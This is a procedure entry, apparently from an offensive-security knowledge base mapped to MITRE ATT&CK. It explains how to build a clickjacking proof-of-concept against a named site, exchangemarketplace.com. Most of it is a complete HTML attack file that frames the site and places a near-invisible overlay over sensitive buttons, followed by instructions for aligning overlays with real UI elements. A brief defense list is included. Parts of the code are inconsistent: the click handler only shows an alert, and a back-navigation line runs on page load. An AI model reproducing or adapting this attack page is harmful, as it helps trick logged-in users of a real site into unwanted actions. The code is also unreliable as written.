---
id: proc-create-poc-clickjacking
name: Create-Clickjacking-Proof-of-Concept
tags:
  - clickjacking
  - poc
  - html
type: procedure
tools:
  - '[[tools/Browser-Unspecified]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:28:12.784Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Create-Clickjacking-Proof-of-Concept

## Summary

This procedure constructs a malicious HTML proof-of-concept (PoC) to exploit clickjacking by embedding the vulnerable site in an iframe and using overlays to deceive user interactions, targeting logged-in sessions on exchangemarketplace.com.

## Description

The PoC leverages the site's framable nature due to the deprecated X-Frame-Options header. It includes an absolutely positioned iframe loading https://exchangemarketplace.com, transparent overlay divs aligned over sensitive buttons (e.g., inbox, logout), and JavaScript for onload handling and click simulation. When a user clicks the overlay, it triggers actions in the framed site without their awareness, potentially leading to unauthorized access or transactions. Prerequisites: Text editor and basic HTML/JS knowledge; outcomes include a deployable file for attack reproduction.

## Requirements

1. Text editor (e.g., VS Code)
2. Knowledge of HTML, CSS, and JavaScript
3. Confirmed vulnerability from header check

## Defense

Defensive measures and detection strategies:

- Enforce CSP frame-ancestors 'none'
- Educate users on phishing via unfamiliar sites
- Detect iframe usage in client-side scripts through WAF rules

## Objectives

1. Build framable PoC for the target site
2. Align overlays for specific UI deception
3. Test persistence with history manipulation

## Instructions

### Step 1: Write HTML Structure

**Context**: Define the basic page with iframe and overlay elements.

Create `clickjacking-poc.html`:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
    <style>
        body { margin: 0; }
        iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; }
        .overlay { position: absolute; top: 100px; left: 100px; width: 200px; height: 50px; opacity: 0.01; z-index: 10; cursor: pointer; }
    </style>
</head>
<body>
    <div class="overlay" onclick="simulateClick()"></div>
    <iframe src="https://exchangemarketplace.com"></iframe>
    <script>
        window.onload = function() {
            document.querySelector('iframe').style.display = 'block';
        };
        function simulateClick() {
            // JS to forward click to iframe coordinates, e.g., inbox button
            alert('Action triggered in frame!');
        }
        // Prevent back navigation
        if (window.history.length > 1) window.history.go(-1);
    </script>
</body>
</html>
```

> Save the file. The overlay is semi-transparent to trick clicks while hiding the frame.

### Step 2: Customize Overlays

**Context**: Adjust positions based on target UI inspection.

Inspect the framed site's layout (e.g., via dev tools) and tweak CSS top/left values for elements like 'Inbox' or 'Sell' buttons.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used



## Tools Used

- [[tools/Browser-Unspecified]]

## Tags

- [[clickjacking]]
- [[web-exploit]]
